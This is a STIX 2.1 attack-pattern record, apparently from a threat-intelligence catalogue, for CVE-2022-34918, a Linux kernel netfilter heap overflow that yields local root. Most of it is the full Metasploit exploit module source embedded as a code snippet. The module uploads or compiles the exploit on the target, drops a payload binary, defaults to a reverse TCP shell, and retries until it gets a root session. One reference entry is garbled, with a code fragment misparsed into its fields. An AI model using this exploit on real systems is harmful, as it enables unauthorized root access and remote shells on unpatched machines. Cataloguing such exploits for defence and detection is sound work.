{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e94bd749-4a54-4fcf-86be-12e3f9eedd03",
    "created": "2024-08-14T16:58:28.915122Z",
    "modified": "2024-08-14T16:58:28.915126Z",
    "name": "Netfilter nft_set_elem_init Heap Overflow Privilege Escalation",
    "description": " An issue was discovered in the Linux kernel through 5.18.9. A type confusion bug in nft_set_elem_init (leading to a buffer overflow) could be used by a local attacker to escalate privileges. The attacker can obtain root access, but must start with an unprivileged user namespace to obtain CAP_NET_ADMIN access. The issue exists in nft_setelem_parse_data in net/netfilter/nf_tables_api.c.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/netfilter_nft_set_elem_init_privesc.rb",
            "external_id": "netfilter_nft_set_elem_init_privesc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-34918"
        },
        {
            "source_name": "reference",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-34918"
        },
        {
            "source_name": "reference",
            "url": "https://ubuntu.com/security/CVE-2022-34918"
        },
        {
            "source_name": "reference",
            "url": "https://www.randorisec.fr/crack-linux-firewall/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/randorisec/CVE-2022-34918-LPE-PoC"
        },
        {
            "source_name": "ubuntu_offsets=strip_comments(get_external_source_code(CVE-2022-34918",
            "external_id": "src/util.c)).scan(/kernels\\\\=\\{(.+?)\\};/m).flatten.first"
        }
    ],
    "x_code_snippet": "# frozen_string_literal: true\n\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = AverageRanking\n  include Msf::Post::Common\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Post::Linux::Compile\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Netfilter nft_set_elem_init Heap Overflow Privilege Escalation',\n        'Description' => %q{\n          An issue was discovered in the Linux kernel through 5.18.9.\n          A type confusion bug in nft_set_elem_init (leading to a buffer overflow)\n          could be used by a local attacker to escalate privileges.\n          The attacker can obtain root access, but must start with an unprivileged\n          user namespace to obtain CAP_NET_ADMIN access.\n          The issue exists in nft_setelem_parse_data in net/netfilter/nf_tables_api.c.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Arthur Mongodin <amongodin[at]randorisec.fr> (@_Aleknight_)', # Vulnerability discovery, original exploit PoC\n          'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>' # Metasploit module, exploit PoC updates\n        ],\n        'DisclosureDate' => '2022-02-07',\n        'Platform' => 'linux',\n        'Arch' => [ARCH_X64],\n        'SessionTypes' => %w[meterpreter shell],\n        'DefaultOptions' => {\n          'Payload' => 'linux/x64/shell_reverse_tcp',\n          'PrependSetresuid' => true,\n          'PrependSetresgid' => true,\n          'PrependFork' => true,\n          'WfsDelay' => 30\n        },\n        'Targets' => [['Auto', {}]],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Reliability' => [UNRELIABLE_SESSION], # The module could fail to get root sometimes.\n          'Stability' => [OS_RESOURCE_LOSS, CRASH_OS_DOWN], # After too many failed attempts, the system needs to be restarted.\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        },\n        'References' => [\n          ['CVE', '2022-34918'],\n          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2022-34918'],\n          ['URL', 'https://ubuntu.com/security/CVE-2022-34918'],\n          ['URL', 'https://www.randorisec.fr/crack-linux-firewall/'],\n          ['URL', 'https://github.com/randorisec/CVE-2022-34918-LPE-PoC']\n        ]\n      )\n    )\n\n    register_options(\n      [\n        OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', %w[Auto True False] ]),\n        OptInt.new('MAX_TRIES', [ true, 'Number of times to execute the exploit', 5])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('WritableDir', [true, 'Directory to write persistent payload file.', '/tmp'])\n      ]\n    )\n  end\n\n  def base_dir\n    datastore['WritableDir']\n  end\n\n  def upload_exploit_binary\n    @executable_path = ::File.join(base_dir, rand_text_alphanumeric(5..10))\n    upload_and_chmodx(@executable_path, exploit_data('CVE-2022-34918', 'ubuntu.elf'))\n    register_file_for_cleanup(@executable_path)\n  end\n\n  def upload_payload_binary\n    @payload_path = ::File.join(base_dir, rand_text_alphanumeric(5..10))\n    upload_and_chmodx(@payload_path, generate_payload_exe)\n    register_file_for_cleanup(@payload_path)\n  end\n\n  def upload_source\n    @exploit_source_path = ::File.join(base_dir, rand_text_alphanumeric(5..10))\n    mkdir(@exploit_source_path)\n    register_dir_for_cleanup(@exploit_source_path)\n    dirs = [ '.' ]\n    until dirs.empty?\n      current_dir = dirs.pop\n      dir_full_path = ::File.join(::Msf::Config.install_root, 'external/source/exploits/CVE-2022-34918', current_dir)\n      Dir.entries(dir_full_path).each do |ent|\n        next if ent == '.' || ent == '..'\n\n        full_path_host = ::File.join(dir_full_path, ent)\n        relative_path = ::File.join(current_dir, ent)\n        full_path_target = ::File.join(@exploit_source_path, current_dir, ent)\n        if File.file?(full_path_host)\n          vprint_status(\"Uploading #{relative_path} to #{full_path_target}\")\n          upload_file(full_path_target, full_path_host)\n        elsif File.directory?(full_path_host)\n          vprint_status(\"Creating the directory #{full_path_target}\")\n          mkdir(full_path_target)\n          dirs.push(relative_path)\n        else\n          print_error(\"#{full_path_host} doesn't look like a file or a directory\")\n        end\n      end\n    end\n  end\n\n  def compile_source\n    fail_with(Failure::BadConfig, 'make command not available on the target') unless command_exists?('make')\n    info = cmd_exec(\"make -C #{@exploit_source_path}\")\n    vprint_status(info)\n    @executable_path = ::File.join(@exploit_source_path, 'ubuntu.elf')\n    if exists?(@executable_path)\n      chmod(@executable_path, 0o700) unless executable?(@executable_path)\n      print_good('Compilation was successful')\n    else\n      fail_with(Failure::UnexpectedReply, 'Compilation has failed (executable not found)')\n    end\n  end\n\n  def run_payload\n    success = false\n    1.upto(datastore['MAX_TRIES']) do |i|\n      vprint_status \"Execution attempt ##{i}\"\n      info = cmd_exec(@executable_path, @payload_path)\n      info.each_line do |line|\n        vprint_status(line.chomp)\n      end\n      if session_created?\n        success = true\n        break\n      end\n      sleep 3\n    end\n    if success\n      print_good('A session has been created')\n    else\n      print_bad('Exploit has failed')\n    end\n  end\n\n  def get_external_source_code(cve, file)\n    file_path = ::File.join(::Msf::Config.install_root, \"external/source/exploits/#{cve}/#{file}\")\n    ::File.binread(file_path)\n  end\n\n  def module_check\n    release = kernel_release\n    version = \"#{release} #{kernel_version.split(' ').first}\"\n    ubuntu_offsets = strip_comments(get_external_source_code('CVE-2022-34918', 'src/util.c')).scan(/kernels\\[\\] = \\{(.+?)\\};/m).flatten.first\n    ubuntu_kernels = ubuntu_offsets.scan(/\"(.+?)\"/).flatten\n    if ubuntu_kernels.empty?\n      fail_with(Msf::Module::Failure::BadConfig, 'Error parsing the list of supported kernels.')\n    end\n    fail_with(Failure::NoTarget, \"No offsets for '#{version}'\") unless ubuntu_kernels.include?(version)\n\n    fail_with(Failure::BadConfig, \"#{base_dir} is not writable.\") unless writable?(base_dir)\n    fail_with(Failure::BadConfig, '/tmp is not writable.') unless writable?('/tmp')\n\n    if is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges.')\n    end\n  end\n\n  def check\n    config = kernel_config\n\n    return CheckCode::Unknown('Could not retrieve kernel config') if config.nil?\n\n    return CheckCode::Safe('Kernel config does not include CONFIG_USER_NS') unless config.include?('CONFIG_USER_NS=y')\n\n    return CheckCode::Safe('Unprivileged user namespaces are not permitted') unless userns_enabled?\n\n    return CheckCode::Safe('LKRG is installed') if lkrg_installed?\n\n    arch = kernel_hardware\n\n    return CheckCode::Safe(\"System architecture #{arch} is not supported\") unless arch.include?('x86_64')\n\n    release = kernel_release\n\n    version, patchlvl = release.match(/^(\\d+)\\.(\\d+)/)&.captures\n    if version&.to_i == 5 && patchlvl && (7..19).include?(patchlvl.to_i)\n      return CheckCode::Appears # (\"The kernel #{version} appears to be vulnerable, but no offsets are available for this version\")\n    end\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    module_check unless datastore['ForceExploit']\n\n    if datastore['COMPILE'] == 'True' || (datastore['COMPILE'] == 'Auto' && command_exists?('make'))\n      print_status('Uploading the exploit source code')\n      upload_source\n      print_status('Compiling the exploit source code')\n      compile_source\n    else\n      print_status('Dropping pre-compiled binaries to system...')\n      upload_exploit_binary\n    end\n    print_status('Uploading payload...')\n    upload_payload_binary\n    print_status('Running payload on remote system...')\n    run_payload\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-02-07",
    "x_mitre_platforms": [
        "linux'"
    ]
}